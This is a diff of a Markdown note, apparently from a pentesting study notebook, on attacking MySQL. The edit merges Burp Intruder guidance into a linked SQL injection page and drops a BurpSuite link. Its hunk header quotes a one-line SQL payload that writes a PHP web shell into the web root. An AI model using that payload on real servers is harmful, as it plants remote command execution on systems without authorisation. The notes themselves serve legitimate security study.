@@ -125,14 +125,13 @@ select "<?php system($_GET['cmd']); ?>" into outfile '/var/www/html/shell.php';
 
 ## SQL Injection against MySQL
 
-Detecting and exploiting SQLi (manual detection, login auth bypass, UNION extraction) lives in **[[SQL_Injection]]**. Burp Intruder mechanics (payload markers, attack types, spotting hits) live in **[[BurpSuite]] → Intruder**.
+Detecting and exploiting SQLi (manual detection, login auth bypass, UNION extraction) — plus the Burp Intruder/Repeater mechanics (payload markers, attack types, spotting hits) — all live in **[[SQL_Injection]]**.
 
 ---
 
 ## Related Notes
 
 - [[SQL_Injection]]
-- [[BurpSuite]]
 - [[Web_Enum]]
 - [[Linux_Common_Commands]]
 - [[File_Transfer]]
